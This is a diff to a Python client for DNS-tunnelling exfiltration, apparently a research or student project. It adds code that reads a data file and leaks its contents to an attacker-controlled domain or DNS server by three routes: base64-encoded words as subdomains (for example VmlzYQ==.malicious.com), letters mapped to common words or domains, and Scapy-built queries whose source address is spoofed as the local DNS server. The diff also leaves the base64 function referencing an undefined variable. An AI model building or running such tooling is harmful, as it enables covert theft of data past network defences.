@@ -46,16 +46,18 @@ try:
   METHOD = confDictionary.get("method")
   DOMAIN_NAME = confDictionary.get("domain_name")
   DNS_IP = confDictionary.get("dns_server_ip")
+  DNS_PORT = confDictionary.get("dns_server_port")
   PATH_TO_DATA_FILE = confDictionary.get("path_to_data_file")
 except:
-  print("configuration file not found")
+  print("configuration file not found or it is a wrong format")
 
 DNS_ID_COUNT = 0
 
 #This method sends a dns query with spoofed ip to our destination server
-#The query wonwt get response back
+#The query won't get response back
 
 def spoofed_dns_query(source_ip_addr , des_ip_addr ,des_port, query):
+  global DNS_ID_COUNT
   pct = IP(src=source_ip_addr, dst=des_ip_addr) / UDP( dport=des_port) / DNS(rd=1, qd=DNSQR(qname=query), id=DNS_ID_COUNT)
   DNS_ID_COUNT = (DNS_ID_COUNT+1)%65536
   send(pct)
@@ -284,6 +286,7 @@ def resolve_host_name(host_name_to):
   return result
 
 
+#getting the data file that we want to send to our dns server
 def get_file_to_transfer(path):
   toReturn = []
   try:
@@ -296,9 +299,19 @@ def get_file_to_transfer(path):
   except:
     return toReturn
 
+WORD_OCCURENCES_DICT = dict()
 
+#encodes a word to with base64 encoding
 def get_Base64_qeury(word):
-  message = word
+
+  global WORD_OCCURENCES_DICT
+
+  if word in WORD_OCCURENCES_DICT.keys():
+    WORD_OCCURENCES_DICT[word] = WORD_OCCURENCES_DICT[word] + 1
+    word = word+str(WORD_OCCURENCES_DICT.get(word))
+  else:
+    WORD_OCCURENCES_DICT[word]=0
+
   message_bytes = message.encode('ascii')
   base64_bytes = base64.b64encode(message_bytes)
   base64_message = base64_bytes.decode('ascii')
@@ -308,9 +321,12 @@ def get_Base64_qeury(word):
 
 
 if __name__ == "__main__":
-
   data_file = get_file_to_transfer(PATH_TO_DATA_FILE)
+
   try:
+    #This will use a regular dns query and will send an Base64 encoded words from the data file with the maliciuos domain suffix taken from the configuration file
+    #for example: the word "Visa" will send as VmlzYQ==.malicious.com in the query field of the DNS request
+
     if METHOD == "domain_based64":
       for line in data_file:
         splited = line.split(",")
@@ -319,6 +335,10 @@ if __name__ == "__main__":
           word64=get_Base64_qeury(word)
           resolve_host_name(word64+"."+str(DOMAIN_NAME))
           time.sleep(float(SECONDS_BETWEEN_QUERIES))
+
+    #This method will use a regular dns query and will send a common word with our maliciuos domain suffix (taken from the configuration file)
+    #every letter is mapped to a common word via the LookupDict object and whene given a letter it returns a word corresponding with this letter
+    #For example: the letter v will send as Woman.malicious.com in the query field of the DNS request
 
     elif METHOD == "domain_based":
       dict = lookup.LookupDict("client", "byDomain", "words.csv")
@@ -331,44 +351,31 @@ if __name__ == "__main__":
             resolve_host_name(newWord+"."+str(DOMAIN_NAME))
             time.sleep(float(SECONDS_BETWEEN_QUERIES))
 
+    #This method will use a spoofed DNS query that will be sent directly to our maliciuos DNS server ip(taken from the configuration file)
+    #It will send a regular domain with its original suffix
+    #The source ip will be spoofed to the local dns server ip of the local network
+    # every letter is mapped to a common domain via the LookupDict object and whene given a letter it returns a domain corresponding with this letter
+    # For example: the letter v will send as aliexpress.com in the query field of the DNS request
+    elif METHOD == "ip_based":
+
+      dict = lookup.LookupDict("client", "byIp", "domains.csv")
+      local_dns_ip = get_windows_dns_ips()[0]
+
+      for line in data_file:
+        splited = line.split(",")
+        for word in splited:
+          word = word.lower()
+          for letter in word:
+            newWord = dict.transform(letter)
+            spoofed_dns_query(local_dns_ip, DNS_IP, int(DNS_PORT),newWord)
+            time.sleep(float(SECONDS_BETWEEN_QUERIES))
+
 
   except Exception as e:
-    pass
+    print(e)
+    print("Something went Wrong please make sure you followed the instructions")
 
 
-  # file = get_file_to_transfer()
-  # for line in file:
-  #   splited = line.split(",")
-  #   for word in splited:
-  #     word64=get_Base64_qeury(word)
-  #     resolve_host_name(word64+".malicious.com")
 
-
-  # Get the host name from the command line.
-  # spoofed_dns_query("111.111.111.111","141.226.242.178",5053,"aaa.com")
-  # HOST_NAME = "google.com"
-
-# ### ORIGINAL CODE
-#       # try:
-#       #
-#       #   HOST_NAME = sys.argv[1]
-#       #
-#       # except IndexError:
-#       #
-#       #   print("No host name specified.")
-#       #
-#       #   sys.exit(0)
-#       #   result = resolve_host_name(HOST_NAME)
-#       #
-#       #   print("\nHost Name:\n" + str(result['host_name']))
-#       #   print("\nIP Address:\n" + str(result['ip_address']) + "\n")
-#
-  # while True :
-  #
-  #   result = resolve_host_name(HOST_NAME)
-  #
-  #   print("\nHost Name:\n" + str(result['host_name']))
-  #   print("\nIP Address:\n" + str(result['ip_address']) + "\n")
-  #   time.sleep(10)
 
 
